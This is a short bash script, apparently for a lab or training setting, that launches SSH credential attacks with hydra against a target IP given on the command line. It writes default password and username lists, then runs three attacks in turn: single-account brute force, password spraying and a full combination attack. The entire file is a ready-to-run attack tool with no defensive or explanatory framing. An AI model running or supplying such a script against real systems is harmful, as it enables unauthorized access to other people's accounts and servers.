#!/bin/bash
# SSH Brute Force Attack Script
# Usage: ./hydra_attacks.sh <target_ip>

TARGET=$1

if [ -z "$TARGET" ]; then
    echo "Usage: ./hydra_attacks.sh <target_ip>"
    echo "Example: ./hydra_attacks.sh 192.168.1.50"
    exit 1
fi

echo "[*] Starting SSH Brute Force Attacks against $TARGET"
echo ""

# Create password list
cat > passwords.txt << 'EOF'
123456
password
admin
Password123
Welcome1
root
toor
qwerty
letmein
admin123
EOF

# Create username list
cat > users.txt << 'EOF'
admin
root
testuser
rootbackup
oracle
EOF

# Attack 1: Single user, password list
echo "[+] Attack 1: Brute forcing 'admin' account"
hydra -l admin -P passwords.txt -t 4 ssh://$TARGET
echo ""

# Attack 2: Multiple users, single password (Password Spraying)
echo "[+] Attack 2: Password spraying"
hydra -L users.txt -p password123 -t 4 ssh://$TARGET
echo ""

# Attack 3: Full combination
echo "[+] Attack 3: Full brute force"
hydra -L users.txt -P passwords.txt -t 4 ssh://$TARGET
echo ""

echo "[*] Attacks completed!"